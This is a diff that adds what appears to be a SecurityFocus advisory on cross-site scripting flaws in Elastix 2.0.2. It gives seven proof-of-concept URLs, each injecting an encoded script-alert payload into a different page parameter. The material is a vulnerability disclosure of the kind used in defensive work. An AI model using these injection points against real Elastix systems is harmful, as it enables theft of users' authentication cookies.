@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/44565/info
+
+Elastix is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Elastix 2.0.2 is vulnerable; other versions may also be affected. 
+
+https://www.example.com/index.php?menu=packages&nombre_paquete=%22%2F%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E&submitInstalado=installed&submit_nombre=Search
+
+https://www.example.com/?menu=pbxconfig&display=recordings&Submit=Go&display=recordings&usersnum=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E
+
+https://www.example.com/index.php?menu=cdrreport&date_end=28%20Oct%202010&date_start=28%20Oct%202010&field_name=dst&field_pattern=%22%2F%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&filter=Filter&status=ALL
+
+https://www.example.com/index.php?menu=asterisk_log&filter=2010-10-28&offset=0&busqueda=&ultima_busqueda=&ultimo_offset=&&busqueda=%22%2F%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E&filter=2010-10-28&offset=0&show=Show&ultima_busqueda=&ultimo_offset=
+
+https://www.example.com/index.php?menu=summary_by_extension&option_fil=&value_fil=&date_from=28&date_from=28%20Oct%202010&date_to=28%20Oct%202010&option_fil=Ext&show=Show&value_fil=%22%2F%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
+
+https://www.example.com/index.php?menu=grouplist&action=view&id=1%22/%3E%3Cscript%3Ealert%281%29;%3C/script%3E
+
+https://www.example.com/index.php?menu=group_permission&filter_group=1&filter_resource=%22/%3E%3Cscript%3Ealert%281%29;%3C/script%3E 
